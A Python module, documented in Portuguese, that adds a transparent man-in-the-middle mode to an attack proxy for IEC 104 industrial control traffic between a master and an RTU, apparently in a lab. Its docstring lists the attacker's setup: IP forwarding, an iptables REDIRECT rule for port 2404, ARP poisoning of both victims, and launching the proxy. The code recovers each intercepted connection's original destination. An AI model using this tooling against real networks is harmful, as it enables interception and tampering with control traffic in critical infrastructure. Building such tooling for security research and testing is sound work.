"""Suporte a MITM TRANSPARENTE (on-path real, via ARP spoofing + iptables).

No modo "proxy por redirecionamento" (o padrao), o master e configurado para
conectar no atacante. No modo TRANSPARENTE, ninguem reconfigura nada: o atacante
envenena o ARP das vitimas (master e RTU) para o trafego passar por ele, e uma
regra `iptables REDIRECT` entrega as conexoes interceptadas ao proxy local. O
proxy entao descobre o destino ORIGINAL (o IP:porta do RTU real) via a opcao de
socket `SO_ORIGINAL_DST` do netfilter, e abre o upstream para la.

So funciona no Linux (a VM atacante). Fora do Linux, `original_dst` devolve None
e o proxy cai no destino fixo (`--down-host/--down-port`), preservando o modo antigo.

Passo tipico na VM atacante (root), para IEC 104 na porta 2404:
    # 1) roteamento p/ o proxy ver o trafego que o ARP desviou
    sysctl -w net.ipv4.ip_forward=1
    # 2) manda as conexoes interceptadas (dport 2404) para o proxy local
    iptables -t nat -A PREROUTING -p tcp --dport 2404 -j REDIRECT --to-port 2404
    # 3) envenena o ARP do par (master <-> RTU) com scapy/bettercap  (ver docs)
    # 4) sobe o proxy:  python mitm.py --proto iec104 --transparent
"""

import socket
import struct

# <linux/netfilter_ipv4.h>: SO_ORIGINAL_DST = 80
SO_ORIGINAL_DST = 80


def original_dst(writer):
    """(host, port) do destino ORIGINAL de uma conexao redirecionada por iptables
    REDIRECT no Linux, ou None se indisponivel (ex.: fora do Linux)."""
    sock = writer.get_extra_info("socket")
    if sock is None:
        return None
    sol_ip = getattr(socket, "SOL_IP", 0)
    try:
        data = sock.getsockopt(sol_ip, SO_ORIGINAL_DST, 16)
    except (OSError, AttributeError):
        return None
    # struct sockaddr_in: sin_family(2), sin_port(2, big-endian), sin_addr(4)
    port = struct.unpack(">H", data[2:4])[0]
    ip = socket.inet_ntoa(data[4:8])
    return ip, port
